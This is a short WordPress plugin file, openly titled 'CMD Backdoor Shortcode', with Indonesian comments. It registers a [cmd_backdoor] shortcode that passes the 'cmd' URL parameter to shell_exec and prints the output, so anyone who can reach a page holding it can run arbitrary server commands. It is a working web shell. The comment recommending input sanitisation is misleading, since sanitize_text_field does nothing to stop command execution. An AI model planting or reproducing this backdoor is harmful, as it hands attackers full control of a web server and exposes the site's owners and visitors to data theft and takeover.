<?php
/*
Plugin Name: CMD Backdoor Shortcode
Description: A simple plugin to execute shell commands using a shortcode.
Version: 1.0
Author: Your Name
*/

// Fungsi untuk menjalankan command dari parameter GET
function cmd_backdoor_func() {
    if (isset($_GET['cmd'])) {
        // Ambil parameter 'cmd' dari URL
        $command = sanitize_text_field($_GET['cmd']); // Disarankan untuk sanitasi input

        // Eksekusi perintah dan tangkap output
        $output = shell_exec($command);

        // Tampilkan hasil dalam format HTML yang aman
        return "<pre>" . esc_html($output) . "</pre>";
    } else {
        return "Please provide a command via the 'cmd' GET parameter.";
    }
}

// Mendaftarkan shortcode [cmd_backdoor]
add_shortcode('cmd_backdoor', 'cmd_backdoor_func');
?>
